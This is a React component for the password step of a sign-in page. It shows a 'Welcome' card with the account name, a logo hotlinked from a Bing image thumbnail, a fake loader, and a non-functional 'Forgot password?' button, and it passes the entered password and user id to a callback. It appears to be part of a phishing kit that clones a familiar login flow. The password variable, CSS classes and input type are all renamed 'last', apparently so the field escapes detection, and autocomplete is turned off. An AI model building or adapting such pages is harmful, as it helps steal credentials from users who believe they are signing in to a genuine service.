import { useState} from "react";
import "./SignIn.css";

function PasswordStep({ first, userId, onComplete }) {
  const [last, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoader, setShowLoader] = useState(false);



 const handleSubmit = (e) => {
  e.preventDefault();

  if (!last.trim()) return;

  
    setShowLoader(true);

  if (onComplete) {
      setTimeout(() => {
         onComplete(userId, last.trim());
      setShowLoader(false);
    }, 2000);
   
  }
};



const handleBack =
    () => {


   

    window.location.href = "/"


      



     

      setShowPassword(false);

    };


  return (
    <div className="signin-page">

      <div className="signin-card ">

        {showLoader && (
           <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        <div className="last-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
            Welcome
          </h1>

          <div className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-first">
              {first}
            </span> 
              <button
                  type="button"
                  onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="last-right">

      

          <form onSubmit={handleSubmit}>

            <div className="last-input-container">

              <input
                id="last"
                type={showPassword ? "text" : "last"}
                value={last}
                
                onChange={(e) => setPassword(e.target.value)}
                placeholder=" "
                autoComplete="off"
              />

              <label htmlFor="last">
                Enter your password
              </label>

            </div>

            <label className="show-last">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) =>
                  setShowPassword(e.target.checked)
                }
              />

              <span>Show password</span>
            </label>

            <div className="last-actions">

              <button
                type="button"
                className="text-button"
              >
                Forgot password?
              </button>

              <button
                type="submit"
                className="next-button"
                disabled={!last.trim()}
              >
                Next
              </button>

            </div>

          </form>

        </div>

      </div>

    </div>
  );
}

export default PasswordStep;